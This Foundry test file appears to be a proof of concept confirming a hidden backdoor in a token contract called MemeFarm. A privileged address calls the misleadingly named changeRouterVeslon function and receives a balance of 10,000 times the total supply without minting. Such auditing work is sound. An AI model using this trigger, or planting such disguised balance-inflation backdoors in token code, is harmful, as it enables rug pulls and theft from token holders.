// SPDX-License-Identifier: MIT
pragma solidity 0.8.6;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/MemeFarm.sol";

contract MockWETH {
    // Minimal WETH mock implementation
}

contract MockFactory {
    function createPair(address, address) external pure returns (address) {
        return address(0x7890000000000000000000000000000000000001);
    }
}

contract MockRouter {
    address public immutable factory;
    address public immutable WETH;
    
    constructor(address _factory, address _weth) {
        factory = _factory;
        WETH = _weth;
    }
}

contract MemeFarmTokenMintTest is Test {
    MemeFarm public token;
    address constant HARDCODED_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant privilegedAddress = 0x3aB960dCf9359083DC126222c03bfB0d2A3C9b6b;

    function setUp() public {
        // Deploy mock Uniswap components
        MockWETH mockWETH = new MockWETH();
        MockFactory mockFactory = new MockFactory();
        MockRouter mockRouter = new MockRouter(address(mockFactory), address(mockWETH));
        
        // Replace hardcoded router contract with mock
        vm.etch(HARDCODED_ROUTER, address(mockRouter).code);
        
        // Deploy contract after mocking environment
        token = new MemeFarm();
    }

    function testMintedTokenInflation() public {
        // Capture state BEFORE exploit
        console.log("--- BEFORE-Trigger State ---");
        uint256 initialSupply = token.totalSupply();
        uint256 initialPrivilegedBalance = token.balanceOf(privilegedAddress);
        console.log("Initial total supply: %d", initialSupply);
        console.log("Initial privileged address balance: %d", initialPrivilegedBalance);
        
        console.log("--- Trigger: changeRouterVeslon() ---");
        // Perform attack - trigger vulnerability
        vm.prank(privilegedAddress);
        token.changeRouterVeslon(privilegedAddress);
        
        // Capture state AFTER exploit
        console.log("--- AFTER-Trigger State ---");
        uint256 finalSupply = token.totalSupply();
        uint256 finalPrivilegedBalance = token.balanceOf(privilegedAddress);
        console.log("Final total supply: %d", finalSupply);
        console.log("Final privileged address balance: %d", finalPrivilegedBalance);
        
        // Calculate expected balance manipulation
        uint256 expectedInflation = initialSupply * 10000;
        bool balanceManipulated = finalPrivilegedBalance == expectedInflation;
        bool supplyUnchanged = finalSupply == initialSupply;
        
        console.log("--- Validation Results ---");
        console.log("Expected inflation amount: %d", expectedInflation);
        console.log("Balance manipulation successful? %s", balanceManipulated ? "YES" : "NO");
        console.log("Total supply unchanged? %s", supplyUnchanged ? "YES" : "NO");

        // Determine final vulnerability verdict
        if (balanceManipulated && supplyUnchanged) {
            console.log("Vulnerability Exists: Privileged address balance inflated to 10000x initial supply without minting");
        } else if (!balanceManipulated) {
            console.log("Vulnerability not Exist: Missing balance inflation effect");
        } else {
            console.log("Vulnerability not Exist: Unexpected total supply increase during manipulation");
        }
    }
}